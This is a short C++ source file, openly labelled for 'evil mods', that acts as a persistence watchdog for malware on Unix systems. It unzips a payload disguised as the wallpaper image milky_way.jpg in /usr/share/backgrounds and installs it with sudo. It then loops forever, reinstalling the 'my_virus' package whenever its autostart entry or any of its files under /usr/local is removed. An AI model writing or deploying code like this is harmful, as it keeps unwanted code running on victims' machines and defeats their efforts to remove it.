// Reinstall missing files (Unix version).
// Evil mods only.

// C/C++ libary.
#include <cstdio>
#include <cstdlib>
#include <cerrno>

// Unix libary.
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

// Make sure the path ends in '/' or '\' on windows.
//#define backup_dir "/usr/share/backgrounds/"
#define backup_dir "/usr/share/backgrounds/"
#define backup_data "milky_way.jpg"

char install_script[] = 
"cd %s; "
"sudo unzip %s; "
"cd my_virus; "
"make -i install; "
"cd ..; "
"sudo rm -rf my_virus";

bool file_ext(const char * file_path) {
	struct stat file_stats;

	if (stat(file_path, &file_stats) == 0)
		return true;
	return false;
}

int main() {
	char script_buf[sizeof(install_script) * 4];

	sprintf(script_buf, install_script,
			backup_dir,
			backup_data);
	system(script_buf);

	char fluff_puppy_path[255];
	sprintf(fluff_puppy_path, "/home/%s/.config/autostart/fluffy_puppy.desktop", getlogin());

	while (true) {
		if (!file_ext(fluff_puppy_path))
			system(script_buf);
		else if (!file_ext("/usr/local/bin/fluffy_puppy"))
			system(script_buf);
		else if (!file_ext("/usr/local/bin/run_evil_puppy"))
			system(script_buf);
		else if (!file_ext("/usr/local/share/evil_virus"))
			system(script_buf);
		else if (!file_ext("/usr/local/share/evil_virus/dog.png"))
			system(script_buf);

		sleep(1);
	}

	return 0;
}
